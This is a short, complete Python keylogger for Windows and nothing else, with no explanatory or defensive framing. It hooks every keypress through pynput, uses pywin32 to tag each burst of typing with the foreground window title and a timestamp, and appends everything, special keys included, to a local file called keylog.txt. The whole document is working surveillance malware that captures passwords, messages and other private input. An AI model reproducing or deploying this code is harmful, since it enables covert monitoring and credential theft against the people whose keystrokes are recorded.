from pynput import keyboard
from datetime import datetime
import win32gui  # From pywin32
import os

log_file = "keylog.txt"
current_window = ""

def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

def on_press(key):
    global current_window
    window = get_active_window()

    if window != current_window:
        current_window = window
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n[Window: {window} | Time: {datetime.now()}]\n")

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{key}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
